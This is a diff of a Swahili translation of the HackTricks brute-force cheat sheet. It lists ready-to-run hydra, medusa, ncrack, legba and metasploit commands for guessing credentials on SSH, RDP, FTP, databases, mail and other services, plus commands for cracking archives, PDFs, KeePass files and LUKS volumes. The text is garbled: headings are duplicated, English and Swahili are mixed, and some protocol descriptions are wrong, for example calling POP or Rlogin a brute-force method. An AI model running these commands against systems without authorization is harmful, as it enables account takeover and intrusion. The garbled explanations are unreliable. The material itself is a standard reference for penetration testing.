@@ -1,6 +1,6 @@
-# Brute Force - Mwongozo wa Udanganyifu
+# Brute Force - CheatSheet
 
-<figure><img src="../.gitbook/assets/image (45).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>
 
 \
 Tumia [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) kujenga na **kutumia workflows** kwa urahisi zinazotumia zana za **jamii ya juu zaidi** duniani.\
@@ -10,21 +10,21 @@ Pata Ufikiaji Leo:
 
 <details>
 
-<summary><strong>Jifunze AWS hacking kutoka sifuri hadi shujaa na</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Mtaalam wa Timu Nyekundu ya AWS ya HackTricks)</strong></a><strong>!</strong></summary>
+<summary><strong>Jifunze AWS hacking kutoka sifuri hadi shujaa na</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
 
 Njia nyingine za kusaidia HackTricks:
 
-* Ikiwa unataka kuona **kampuni yako ikitangazwa kwenye HackTricks** au **kupakua HackTricks kwa PDF** Angalia [**MIPANGO YA KUJIUNGA**](https://github.com/sponsors/carlospolop)!
+* Ikiwa unataka kuona **kampuni yako ikitangazwa kwenye HackTricks** au **kupakua HackTricks kwa PDF** Angalia [**MIPANGO YA USAJILI**](https://github.com/sponsors/carlospolop)!
 * Pata [**bidhaa rasmi za PEASS & HackTricks**](https://peass.creator-spring.com)
 * Gundua [**Familia ya PEASS**](https://opensea.io/collection/the-peass-family), mkusanyiko wetu wa [**NFTs**](https://opensea.io/collection/the-peass-family) ya kipekee
-* **Jiunge na** 💬 [**Kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au kikundi cha [**telegram**](https://t.me/peass) au **tufuate** kwenye **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
-* **Shiriki mbinu zako za udanganyifu kwa kuwasilisha PRs kwa** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
+* **Jiunge na** 💬 [**Kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au [**kikundi cha telegram**](https://t.me/peass) au **tufuate** kwenye **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* **Shiriki mbinu zako za udukuzi kwa kuwasilisha PRs kwa** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
 
 </details>
 
-## Vitambulisho vya Kimsingi
+## Vibali vya Kimsingi
 
-**Tafuta kwenye google** vitambulisho vya msingi vya teknolojia inayotumiwa, au **jaribu viungo hivi**:
+**Tafuta kwenye google** vibali vya msingi vya teknolojia inayotumiwa, au **jaribu viungo hivi**:
 
 * [**https://github.com/ihebski/DefaultCreds-cheat-sheet**](https://github.com/ihebski/DefaultCreds-cheat-sheet)
 * [**http://www.phenoelit.org/dpl/dpl.html**](http://www.phenoelit.org/dpl/dpl.html)
@@ -39,9 +39,9 @@ Njia nyingine za kusaidia HackTricks:
 * [**https://many-passwords.github.io/**](https://many-passwords.github.io)
 * [**https://theinfocentric.com/**](https://theinfocentric.com/) 
 
-## **Tengeneza Kamusi Zako**
+## **Tengeneza Dictionaries Yako Mwenyewe**
 
-Pata habari nyingi kuhusu lengo lako iwezekanavyo na tengeneza kamusi ya kipekee. Zana zinazoweza kusaidia:
+Pata habari nyingi kuhusu lengo kama unavyoweza na tengeneza orodha ya maneno ya kawaida. Zana zinazoweza kusaidia:
 
 ### Crunch
 ```bash
@@ -56,13 +56,13 @@ crunch 6 8 -t ,@@^^%%
 ```
 ### Cewl
 
-Cewl ni zana inayotumiwa kwa ufanisi kwenye uchunguzi wa kijamii. Inachambua maandishi kwenye ukurasa wa wavuti na kutoa maneno muhimu kwa ajili ya mashambulizi ya nguvu. Unaweza kutumia maneno haya kama orodha ya uwezekano wa nywila au kama data ya kuingiza kwenye mashambulizi ya nguvu.
+### Cewl
 ```bash
 cewl example.com -m 5 -w words.txt
 ```
 ### [CUPP](https://github.com/Mebus/cupp)
 
-Zalisha nywila kulingana na maarifa yako kuhusu muathiriwa (majina, tarehe...)
+Unda nywila kulingana na maarifa yako kuhusu muathiriwa (majina, tarehe...)
 ```
 python3 cupp.py -h
 ```
@@ -102,17 +102,17 @@ Finished in 0.920s.
 * [**https://hashkiller.io/listmanager**](https://hashkiller.io/listmanager)
 * [**https://github.com/Karanxa/Bug-Bounty-Wordlists**](https://github.com/Karanxa/Bug-Bounty-Wordlists)
 
-<figure><img src="../.gitbook/assets/image (45).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>
 
 \
-Tumia [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) kujenga na **kutumia mifumo ya kazi** kwa urahisi ikiwa na zana za jamii zilizo **za juu zaidi** duniani.\
+Tumia [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) kujenga na **kutumia** taratibu za kiotomatiki zinazotumia zana za **jamii yenye maendeleo zaidi** duniani.\
 Pata Ufikiaji Leo:
 
 {% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}
 
 ## Huduma
 
-Zimepangwa kwa herufi kwa utaratibu wa jina la huduma.
+Imepangwa kwa herufi kwa jina la huduma.
 
 ### AFP
 ```bash
@@ -126,17 +126,17 @@ msf> run
 ```
 ### AJP
 
-AJP (Apache JServ Protocol) is a binary protocol that can be brute-forced using tools like Hydra or Burp Suite Intruder. It is used to communicate between a web server and a servlet container, and can be targeted for brute-force attacks to gain unauthorized access.
+AJP ni itifaki ya kawaida inayotumiwa kwa kushambulia seva za programu za Java. Inaweza kudukuliwa kwa kutumia mbinu za nguvu ya kutisha kama vile **brute force**.
 ```bash
 nmap --script ajp-brute -p 8009 <IP>
 ```
-## AMQP (ActiveMQ, RabbitMQ, Qpid, JORAM and Solace)
+## AMQP (ActiveMQ, RabbitMQ, Qpid, JORAM na Solace)
 ```bash
 legba amqp --target localhost:5672 --username admin --password data/passwords.txt [--amql-ssl]
 ```
 ### Cassandra
 
-Cassandra ni mfumo wa usambazaji wa hifadhidata ambao unaweza kuhifadhi data kwenye seva nyingi. Kwa kawaida, kuna vikwazo vya kujaribu kuingia kwenye akaunti za mtumiaji kwa kutumia mchanganyiko wa majina ya mtumiaji na nywila. Kwa kutumia zana kama Hydra au Medusa, unaweza kufanya mashambulizi ya nguvu kwa kujaribu majina ya mtumiaji na nywila tofauti hadi upate upatikanaji. Kumbuka kwamba kufanya mashambulizi ya nguvu kwenye mifumo ambayo hauruhusiwi kufanya hivyo inaweza kuwa kinyume cha sheria.
+Cassandra ni mfumo wa kuhifadhi data wa chanzo wazi unaotumia mbinu ya kuvunja nguvu (brute force) kwa kudhibitisha vibali vya upatikanaji.
 ```bash
 nmap --script cassandra-brute -p 9160 <IP>
 # legba ScyllaDB / Apache Casandra
@@ -145,25 +145,23 @@ legba scylla --username cassandra --password wordlists/passwords.txt --target lo
 ### CouchDB
 
 ### CouchDB
-
-CouchDB is a database that can be brute-forced using a tool like `Hydra`. The default port for CouchDB is `5984`. To brute-force CouchDB, you can use a wordlist containing common passwords.
 ```bash
 msf> use auxiliary/scanner/couchdb/couchdb_login
 hydra -L /usr/share/brutex/wordlists/simple-users.txt -P /usr/share/brutex/wordlists/password.lst localhost -s 5984 http-get /
 ```
-### Docker Registry
+### Usajili wa Docker
 ```
 hydra -L /usr/share/brutex/wordlists/simple-users.txt  -P /usr/share/brutex/wordlists/password.lst 10.10.10.10 -s 5000 https-get /v2/
 ```
 ### Elasticsearch
 
-Elasticsearch ni injini ya utaftaji wa wazi inayotumika sana kwa kuhifadhi na kutafuta data. Inaweza kudhibitiwa kwa kutumia Brute Force kwa kutumia programu kama Hydra au Medusa. Kwa kufanya hivyo, unaweza kujaribu maneno muhimu au nywila kwa idadi kubwa ya majaribio hadi upate ufikiaji usio halali kwenye mfumo wa Elasticsearch.
+### Elasticsearch
 ```
 hydra -L /usr/share/brutex/wordlists/simple-users.txt -P /usr/share/brutex/wordlists/password.lst localhost -s 9200 http-get /
 ```
 ### FTP
 
-FTP (File Transfer Protocol) ni itifaki inayotumiwa kusafirisha faili kutoka kwenye mtandao hadi kwenye kompyuta au kutoka kwenye kompyuta hadi kwenye mtandao.
+### FTP
 ```bash
 hydra -l root -P passwords.txt [-t 32] <IP> ftp
 ncrack -p 21 --user root -P passwords.txt <IP> [-T 5]
@@ -182,8 +180,6 @@ medusa -h <IP> -u <username> -P  <passwords.txt> -M  http -m DIR:/path/to/auth -
 legba http.basic --username admin --password wordlists/passwords.txt --target http://localhost:8888/
 ```
 ### HTTP - NTLM
-
-Brute force attacks against HTTP NTLM are typically carried out using tools like Hydra, Ncrack, Medusa, and others. These tools allow an attacker to automate the guessing of usernames and passwords against NTLM authentication. It is important to note that brute force attacks can be time-consuming and resource-intensive, so it is recommended to use them as a last resort and after other avenues of attack have been exhausted.
 ```bash
 legba http.ntlm1 --domain example.org --workstation client --username admin --password wordlists/passwords.txt --target https://localhost:8888/
 legba http.ntlm2 --domain example.org --workstation client --username admin --password wordlists/passwords.txt --target https://localhost:8888/
@@ -193,16 +189,16 @@ legba http.ntlm2 --domain example.org --workstation client --username admin --pa
 hydra -L /usr/share/brutex/wordlists/simple-users.txt -P /usr/share/brutex/wordlists/password.lst domain.htb  http-post-form "/path/index.php:name=^USER^&password=^PASS^&enter=Sign+in:Login name or password is incorrect" -V
 # Use https-post-form mode for https
 ```
-### **HTTP - CMS --** (W)ordpress, (J)oomla au (D)rupal au (M)oodle
+Kwa http**s** lazima ubadilishe kutoka "http-post-form" hadi "**https-post-form"**
 
-Kwa http**s** unapaswa kubadilisha kutoka "http-post-form" hadi "**https-post-form"**
+### **HTTP - CMS --** (W)ordpress, (J)oomla au (D)rupal au (M)oodle
 ```bash
 cmsmap -f W/J/D/M -u a -p a https://wordpress.com
 # Check also https://github.com/evilsocket/legba/wiki/HTTP
 ```
 ### IMAP
 
-### IMAP
+IMAP (**Internet Message Access Protocol**) is a widely used protocol for email retrieval. When conducting a brute-force attack against an IMAP server, you can use tools like Hydra or Metasploit to automate the process of trying different username and password combinations until a successful login is achieved. This can be a time-consuming process, but it can be effective in gaining unauthorized access to an email account.
 ```bash
 hydra -l USERNAME -P /path/to/passwords.txt -f <IP> imap -V
 hydra -S -v -l USERNAME -P /path/to/passwords.txt -s 993 -f <IP> imap -V
@@ -213,12 +209,14 @@ legba imap --username user --password data/passwords.txt --target localhost:993
 
 ### IRC
 
-IRC (Internet Relay Chat) is a popular communication protocol that enables real-time messaging and file sharing over the Internet. It is commonly used by hackers to communicate and collaborate with each other. IRC channels are often used to share hacking techniques, tools, and resources. Hackers can also use IRC for social engineering attacks, phishing, and spreading malware. It is important for cybersecurity professionals to monitor IRC channels to stay informed about the latest hacking trends and activities.
+IRC (Internet Relay Chat) is a widely used protocol for real-time text messaging. It is commonly used for online group discussions, team collaboration, and sometimes even for socializing. IRC servers host various channels where users can join to discuss specific topics or just hang out. 
+
+### IRC
+
+IRC (Internet Relay Chat) ni itifaki inayotumika sana kwa ujumbe wa maandishi wa wakati halisi. Mara nyingi hutumika kwa majadiliano ya kikundi mtandaoni, ushirikiano wa timu, na mara chache hata kwa kijamii. Seva za IRC hukaribisha njia mbalimbali ambapo watumiaji wanaweza kujiunga kujadili mada maalum au tu kuchat.
 ```bash
 nmap -sV --script irc-brute,irc-sasl-brute --script-args userdb=/path/users.txt,passdb=/path/pass.txt -p <PORT> <IP>
 ```
-### ISCSI
-
 ### ISCSI
 ```bash
 nmap -sV --script iscsi-brute --script-args userdb=/var/usernames.txt,passdb=/var/passwords.txt -p 3260 <IP>
@@ -250,41 +248,21 @@ jwt-cracker "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibm
 ```
 ### LDAP
 
-LDAP (Lightweight Directory Access Protocol) ni itifaki inayotumiwa kwa kawaida kwa uthibitishaji wa watumiaji. Kwa kawaida, mbinu ya nguvu ya kawaida inaweza kutumika kwa LDAP kwa kujaribu nywila zilizopendekezwa au orodha ya maneno.
+LDAP (Lightweight Directory Access Protocol) ni itifaki ya mawasiliano inayotumiwa kusoma na kuandika data kutoka kwa seva ya saraka.
 ```bash
 nmap --script ldap-brute -p 389 <IP>
 legba ldap --target 127.0.0.1:389 --username admin --password @wordlists/passwords.txt --ldap-domain example.org --single-match
 ```
 ### MQTT
 
-#### Brute Force
-
-Brute force attacks involve trying all possible combinations of usernames and passwords until the correct one is found. This method can be effective against MQTT servers that do not have proper security measures in place. Attackers can use automated tools to rapidly try different combinations, gaining unauthorized access to the server. It is important to use strong, unique passwords and implement other security measures to protect against brute force attacks. 
-
-#### Dictionary Attack
-
-A dictionary attack is similar to a brute force attack, but instead of trying all possible combinations, it uses a predefined list of commonly used passwords. This method is often more efficient than brute force as it targets the most likely passwords first. It is crucial to use complex and unique passwords to mitigate the risk of a successful dictionary attack.
+### MQTT
 ```
 ncrack mqtt://127.0.0.1 --user test –P /root/Desktop/pass.txt -v
 legba mqtt --target 127.0.0.1:1883 --username admin --password wordlists/passwords.txt
 ```
 ### Mongo
 
-#### Brute Force
-
-Brute force attacks involve trying all possible combinations of a password until the correct one is found. This method can be used to gain unauthorized access to MongoDB databases by repeatedly trying different passwords until the correct one is discovered.
-
-#### Prevention
-
-To prevent brute force attacks on your MongoDB databases, you can implement the following measures:
-
-1. **Strong Passwords**: Use complex and unique passwords that are difficult to guess.
-2. **Account Lockout Policy**: Implement an account lockout policy that locks out an account after a certain number of failed login attempts.
-3. **Rate Limiting**: Implement rate limiting to restrict the number of login attempts within a specific time frame.
-4. **Multi-Factor Authentication (MFA)**: Enable MFA to add an extra layer of security to the authentication process.
-5. **Monitoring and Logging**: Monitor and log login attempts to detect and respond to suspicious activity.
-
-By implementing these preventive measures, you can enhance the security of your MongoDB databases and reduce the risk of unauthorized access through brute force attacks.
+Brute-forcing a MongoDB database involves attempting to log in to the database by systematically trying all possible passwords until the correct one is found. This is typically done using automated tools that can quickly try thousands or even millions of password combinations. It is important to note that brute-forcing is illegal and unethical unless you have explicit permission to test the security of a system.
 ```bash
 nmap -sV --script mongodb-brute -n -p 27017 <IP>
 use auxiliary/scanner/mongodb/mongodb_login
@@ -292,13 +270,13 @@ legba mongodb --target localhost:27017 --username root --password data/passwords
 ```
 ### MSSQL
 
-Brute-force attacks against MSSQL servers can be carried out using tools like Hydra, Ncrack, and Metasploit. These tools allow you to automate the process of trying different username and password combinations until the correct one is found. It is important to note that brute-forcing a MSSQL server is illegal unless you have explicit permission to do so as part of a penetration testing engagement.
+### MSSQL
 ```bash
 legba mssql --username SA --password wordlists/passwords.txt --target localhost:1433
 ```
 ### MySQL
 
-MySQL ni mfumo wa usimamizi wa database wa bure na wa chanzo wazi unaotumiwa sana. Kwa kawaida, mbinu ya kwanza ya kujaribu kuvunja usalama wa nenosiri la MySQL ni kwa kutumia mbinu ya nguvu ya brute. Hii inahusisha jaribio la kuingia kwa kutumia orodha ya maneno au tarakimu hadi kupata nywila sahihi. Kuna zana nyingi zinazopatikana kama Hydra au Medusa ambazo zinaweza kutumika kwa madhumuni haya.
+### MySQL
 ```bash
 # hydra
 hydra -L usernames.txt -P pass.txt <IP> mysql
@@ -314,9 +292,7 @@ legba mysql --username root --password wordlists/passwords.txt --target localhos
 ```
 ### OracleSQL
 
-#### Brute Force
-
-Brute force ni mbinu ya msingi ya kujaribu kila chaguo linalowezekana kwa kutumia programu au script. Kwa OracleSQL, hii inaweza kutumika kujaribu kubaini nywila za mtumiaji kwa kujaribu kombinaysheni zote zinazowezekana za herufi na tarakimu. Kwa kawaida, mbinu hii inaweza kuwa polepole na inaweza kuzuiliwa na hatua za usalama kama vile kuzuia upatikanaji baada ya jaribio fulani.
+### OracleSQL
 ```bash
 patator oracle_login sid=<SID> host=<IP> user=FILE0 password=FILE1 0=users-oracle.txt 1=pass-oracle.txt -x ignore:code=ORA-01017
 
@@ -352,7 +328,7 @@ nmap -p1521 --script oracle-brute-stealth --script-args oracle-brute-stealth.sid
 
 ### POP
 
-POP (Post Office Protocol) ni itifaki ya barua pepe inayotumiwa na watumiaji kuunganisha na seva ya barua pepe kusoma ujumbe wao. Kwa kawaida, POP hufanya kazi kwenye bandari ya 110. Wakati mwingine, unaweza kutumia mbinu ya kubadilisha nguvu kwa kujaribu maneno muhimu au nywila k kuingia kwenye akaunti ya barua pepe ya mtu mwingine.
+POP (Post Office Protocol) ni njia ya kawaida ya kuingia kwenye akaunti ya barua pepe kwa kutumia mbinu ya Brute Force.
 ```bash
 hydra -l USERNAME -P /path/to/passwords.txt -f <IP> pop3 -V
 hydra -S -v -l USERNAME -P /path/to/passwords.txt -s 995 -f <IP> pop3 -V
@@ -365,21 +341,7 @@ legba pop3 --username admin@example.com --password wordlists/passwords.txt --tar
 ```
 ### PostgreSQL
 
-#### Brute Force
-
-Brute force is a common technique used to gain unauthorized access to a system by trying all possible combinations of usernames and passwords until the correct one is found. This method can be used to attack PostgreSQL databases by repeatedly trying different login credentials until the attacker gains access.
-
-#### Protection
-
-To protect against brute force attacks on PostgreSQL databases, it is recommended to:
-
-1. **Use Strong Passwords**: Ensure that strong, complex passwords are used for all database accounts.
-2. **Limit Login Attempts**: Implement mechanisms to limit the number of login attempts allowed within a certain time frame.
-3. **Enable Account Lockout**: Lock out user accounts after a certain number of failed login attempts to prevent further unauthorized access.
-4. **Monitor Logs**: Regularly monitor database logs for any suspicious login activities and investigate them promptly.
-5. **Implement Two-Factor Authentication**: Consider implementing two-factor authentication for an added layer of security.
-
-By following these protection measures, you can significantly reduce the risk of unauthorized access to your PostgreSQL databases through brute force attacks.
+### PostgreSQL
 ```bash
 hydra -L /root/Desktop/user.txt –P /root/Desktop/pass.txt <IP> postgres
 medusa -h <IP> –U /root/Desktop/user.txt –P /root/Desktop/pass.txt –M postgres
@@ -398,7 +360,7 @@ cat rockyou.txt | thc-pptp-bruter –u <Username> <IP>
 ```
 ### RDP
 
-### RDP
+RDP ni itifaki ya mbali inayotumiwa kwa kawaida kwa kuingia kijijini kwenye mifumo ya Windows. Kwa sababu ya upatikanaji wake wa kawaida, mara nyingi hushambuliwa kwa njia ya nguvu ya brute.
 ```bash
 ncrack -vv --user <User> -P pwds.txt rdp://<IP>
 hydra -V -f -L <userslist> -P <passwlist> rdp://<IP>
@@ -406,7 +368,7 @@ legba rdp --target localhost:3389 --username admin --password data/passwords.txt
 ```
 ### Redis
 
-Redis ni mfumo wa kuhifadhi data wa haraka sana unaotumika sana kwa kuhifadhi cache na kusimamia data inayobadilika mara kwa mara.
+### Redis
 ```bash
 msf> use auxiliary/scanner/redis/redis_login
 nmap --script redis-brute -p 6379 <IP>
@@ -415,27 +377,23 @@ legba redis --target localhost:6379 --username admin --password data/passwords.t
 ```
 ### Rexec
 
-Rexec ni mbinu ya kufanya mashambulizi ya nguvu kwa kujaribu maneno au nywila tofauti hadi kupata ile sahihi. Mbinu hii inaweza kutumika kuvunja ulinzi wa nywila na kuingia kwa lazima kwenye mfumo au akaunti.
+Rexec ni mbinu ya kufanya mashambulizi ya nguvu kwa kujaribu maneno au taratibu nyingi hadi kupata nywila sahihi au ufikiaji unaotakiwa.
 ```bash
 hydra -l <username> -P <password_file> rexec://<Victim-IP> -v -V
 ```
 ### Rlogin
 
-Rlogin ni mbinu ya kuingilia mfumo kwa kutumia jaribio na makosa ya maneno ya siri.
+Rlogin ni mbinu ya kuingilia mfumo kwa kutumia nguvu ya brute.
 ```bash
 hydra -l <username> -P <password_file> rlogin://<Victim-IP> -v -V
 ```
 ### Rsh
 
-Rsh ni itifaki ya mbali inayotumika kwa kuingia kwa mbali kwenye mifumo ya Unix. Kwa sababu ya udhaifu wake wa usalama, Rsh haipaswi kutumiwa kwenye mazingira ya uzalishaji. Kwa kawaida, mbinu ya kwanza ya kufikia udhibiti wa mfumo wa Unix ni kujaribu kuingia kwa kutumia jina la mtumiaji na nywila kwa kutumia Rsh. Hii inaweza kufanywa kwa kutumia zana za kubadilisha nywila au kwa kujaribu nywila za kawaida.
+Rsh ni itifaki ya mbali inayoruhusu mtumiaji kuingia kwa mbali kwenye mfumo wa kompyuta na kufanya kazi kama angekuwa ameingia moja kwa moja kwenye mfumo huo. Itifaki hii inaweza kutumika kwa njia mbaya na wadukuzi kwa kujaribu kuingia kwa nguvu kwa kutumia mbinu ya Brute Force.
 ```bash
 hydra -L <Username_list> rsh://<Victim_IP> -v -V
 ```
 [http://pentestmonkey.net/tools/misc/rsh-grind](http://pentestmonkey.net/tools/misc/rsh-grind)
-
-### Rsync
-
-### Rsync
 
 ### Rsync
 
@@ -446,13 +404,9 @@ nmap -sV --script rsync-brute --script-args userdb=/var/usernames.txt,passdb=/va
 ### RTSP
 
 ### RTSP
-
-RTSP (Real Time Streaming Protocol) ni itifaki inayotumiwa kwa ajili ya uhamishaji wa data kwa njia ya mtandao.
 ```bash
 hydra -l root -P passwords.txt <IP> rtsp
 ```
-### SFTP
-
 ### SFTP
 ```bash
 legba sftp --username admin --password wordlists/passwords.txt --target localhost:22
@@ -486,15 +440,13 @@ legba smtp --username admin@example.com --password wordlists/passwords.txt --tar
 ```
 ### SOCKS
 
-SOCKS ni itifaki ya mtandao inayotumiwa kwa kusudi la kusafirisha data kupitia firewall ya mtandao. Inaweza kutumika kama sehemu ya mbinu ya kuvunja nguvu kwa kusudi la kujaribu nywila kwa idadi kubwa ya majaribio.
+SOCKS ni itifaki inayotumiwa kwa kawaida kwa kusudi la kuficha shughuli za mtandao. Inaweza kutumika kama njia ya kuficha anwani ya IP ya mtumiaji au kufikia maeneo ya mtandao ambayo yanaweza kuwa vikwazo. Wakati mwingine, SOCKS inaweza kutumika kama sehemu ya mchakato wa kuvunja nywila kwa kujaribu nywila nyingi kwa mfululizo (brute force attack).
 ```bash
 nmap  -vvv -sCV --script socks-brute --script-args userdb=users.txt,passdb=/usr/share/seclists/Passwords/xato-net-10-million-passwords-1000000.txt,unpwndb.timelimit=30m -p 1080 <IP>
 legba socks5 --target localhost:1080 --username admin --password data/passwords.txt
 # With alternative address
 legba socks5 --target localhost:1080 --username admin --password data/passwords.txt --socks5-address 'internal.company.com' --socks5-port 8080
 ```
-### SQL Server
-
 ### SQL Server
 
 ### SQL Server
@@ -508,17 +460,7 @@ msf> use auxiliary/scanner/mssql/mssql_login #Be careful, you can block accounts
 ```
 ### SSH
 
-#### Brute Force
-
-Brute force attacks involve trying all possible combinations of usernames and passwords until the correct one is found. This method is time-consuming but can be effective if the credentials are weak.
-
-#### Dictionary Attack
-
-A dictionary attack involves using a predefined list of words or phrases as potential passwords. This method is more efficient than brute force as it reduces the number of possible combinations to try.
-
-#### SSH Brute Force Tools
-
-There are several tools available for conducting SSH brute force attacks, such as Hydra, Medusa, and Ncrack. These tools automate the process of trying different username and password combinations to gain unauthorized access to SSH servers.
+### SSH
 ```bash
 hydra -l root -P passwords.txt [-t 32] <IP> ssh
 ncrack -p 22 --user root -P passwords.txt <IP> [-T 5]
@@ -530,17 +472,17 @@ legba ssh --username admin --password '@/some/path/*' --ssh-auth-mode key --targ
 ```
 #### Funguo dhaifu za SSH / Debian PRNG inayoweza kutabirika
 
-Baadhi ya mifumo ina dosari inayojulikana katika mbegu ya nasibu inayotumika kuzalisha vifaa vya kryptografia. Hii inaweza kusababisha nafasi ndogo sana ya funguo ambayo inaweza kuvunjwa kwa kutumia zana kama [snowdroppe/ssh-keybrute](https://github.com/snowdroppe/ssh-keybrute). Sets zilizotangulia kuzalishwa za funguo dhaifu pia zinapatikana kama [g0tmi1k/debian-ssh](https://github.com/g0tmi1k/debian-ssh).
+Baadhi ya mifumo ina dosari inayojulikana katika mbegu ya nasibu inayotumika kuzalisha vifaa vya kryptographia. Hii inaweza kusababisha nafasi ndogo sana ya funguo ambayo inaweza kuvunjwa kwa kutumia zana kama [snowdroppe/ssh-keybrute](https://github.com/snowdroppe/ssh-keybrute). Sets zilizotangulia kuzalishwa za funguo dhaifu pia zinapatikana kama [g0tmi1k/debian-ssh](https://github.com/g0tmi1k/debian-ssh).
 
 ### STOMP (ActiveMQ, RabbitMQ, HornetQ na OpenMQ)
 
-Itifaki ya maandishi ya STOMP ni itifaki ya ujumbe inayotumiwa sana **kuruhusu mawasiliano laini na mwingiliano na huduma maarufu za foleni za ujumbe** kama RabbitMQ, ActiveMQ, HornetQ, na OpenMQ. Inatoa njia iliyostandardizwa na yenye ufanisi wa kubadilishana ujumbe na kutekeleza shughuli mbalimbali za ujumbe.
+Itifaki ya maandishi ya STOMP ni itifaki ya ujumbe inayotumiwa sana **kuruhusu mawasiliano laini na mwingiliano na huduma maarufu za foleni za ujumbe** kama RabbitMQ, ActiveMQ, HornetQ, na OpenMQ. Inatoa njia iliyostandardishwa na yenye ufanisi wa kubadilishana ujumbe na kutekeleza shughuli mbalimbali za ujumbe.
 ```bash
 legba stomp --target localhost:61613 --username admin --password data/passwords.txt
 ```
 ### Telnet
 
-Telnet ni itifaki ya mtandao inayotumiwa kwa mawasiliano ya maneno kati ya vifaa vya mtandao. Inaweza kutumika kama njia ya kufanya mashambulizi ya nguvu kwa kujaribu maneno ya siri kwa kuingia kwa nguvu kwenye mfumo.
+Telnet ni itifaki ya mtandao inayotumiwa kwa kuingia kijijini kwenye mfumo wa kompyuta. Inaweza kutumika kama zana ya kufanya mashambulizi ya nguvu kwa kujaribu maneno ya siri tofauti kwa kuingia kijijini kwenye mfumo.
 ```bash
 hydra -l root -P passwords.txt [-t 32] <IP> telnet
 ncrack -p 23 --user root -P passwords.txt <IP> [-T 5]
@@ -557,7 +499,7 @@ legba telnet \
 ```
 ### VNC
 
-VNC, au Virtual Network Computing, ni njia ya kudhibiti kompyuta kijijini kupitia mtandao. Kwa kawaida, VNC hufanya kazi kwa kutumia brute force kwenye seva ya VNC ili kupata ufikiaji usioidhinishwa.
+### VNC
 ```bash
 hydra -L /root/Desktop/user.txt –P /root/Desktop/pass.txt -s <PORT> <IP> vnc
 medusa -h <IP> –u root -P /root/Desktop/pass.txt –M vnc
@@ -573,12 +515,10 @@ set RHOSTS <ip>
 set PASS_FILE /usr/share/metasploit-framework/data/wordlists/passwords.lst
 ```
 ### Winrm
-
-Winrm ni itifaki ya usimamizi wa mbali inayotumiwa kwenye mifumo ya Windows. Inaweza kudukuliwa kwa kutumia mbinu ya nguvu ya kufikiria.
 ```bash
 crackmapexec winrm <IP> -d <Domain Name> -u usernames.txt -p passwords.txt
 ```
-<figure><img src="../.gitbook/assets/image (45).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>
 
 \
 Tumia [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) kujenga na **kutumia workflows** kwa urahisi zinazotumia zana za jamii ya **juu zaidi** duniani.\
@@ -620,9 +560,9 @@ john zip.john
 hashcat.exe -m 13600 -a 0 .\hashzip.txt .\wordlists\rockyou.txt
 .\hashcat.exe -m 13600 -i -a 0 .\hashzip.txt #Incremental attack
 ```
-#### Shambulizi la zip ya maandishi yaliyofahamika
+#### Shambulizi la zip la maandishi yaliyofahamika
 
-Unahitaji kujua **maandishi ya wazi** (au sehemu ya maandishi ya wazi) **ya faili iliyomo ndani** ya zip iliyofichwa. Unaweza kuangalia **majina ya faili na ukubwa wa faili zilizomo** ndani ya zip iliyofichwa kwa kukimbia: **`7z l encrypted.zip`**\
+Unahitaji kujua **maandishi wazi** (au sehemu ya maandishi wazi) **ya faili iliyomo ndani** ya zip iliyofichwa. Unaweza kuangalia **majina ya faili na ukubwa wa faili zilizomo** ndani ya zip iliyofichwa kwa kukimbia: **`7z l encrypted.zip`**\
 Pakua [**bkcrack**](https://github.com/kimci86/bkcrack/releases/tag/v1.4.0) kutoka ukurasa wa matoleo.
 ```bash
 # You need to create a zip file containing only the file that is inside the encrypted zip
@@ -636,8 +576,6 @@ zip plaintext.zip plaintext.file
 unzip unlocked.zip #User new_pwd as password
 ```
 ### 7z
-
-Brute-forcing a password-protected 7z file can be done using tools like `7z2hashcat` or `hashcat`. These tools can convert the 7z file's password hash into a format that can be cracked using a brute-force attack.
 ```bash
 cat /usr/share/wordlists/rockyou.txt | 7za t backup.7z
 ```
@@ -650,7 +588,7 @@ apt-get install libcompress-raw-lzma-perl
 ```
 ### PDF
 
-Brute-force attacks are commonly used to crack passwords from PDF files. Tools like **pdfcrack** and **PDF Password Cracker** can be used to automate the process. These tools work by trying all possible password combinations until the correct one is found. It is important to note that brute-force attacks can be time-consuming, especially if the password is long and complex.
+### PDF
 ```bash
 apt-get install pdfcrack
 pdfcrack encrypted.pdf -w /usr/share/wordlists/rockyou.txt
@@ -683,7 +621,7 @@ hashcat -a 0 -m 1000 --username file_NTLM.hashes /usr/share/wordlists/rockyou.tx
 ```
 ### Keepass
 
-Keepass ni chombo cha usimamizi wa nywila kinachotumika kuhifadhi na kusimamia nywila za mtumiaji. Inatumia encryption ili kulinda data zilizohifadhiwa.
+### Keepass
 ```bash
 sudo apt-get install -y kpcli #Install keepass tools like keepass2john
 keepass2john file.kdbx > hash #The keepass is only using password
@@ -717,7 +655,7 @@ cryptsetup luksOpen backup.img mylucksopen
 ls /dev/mapper/ #You should find here the image mylucksopen
 mount /dev/mapper/mylucksopen /mnt
 ```
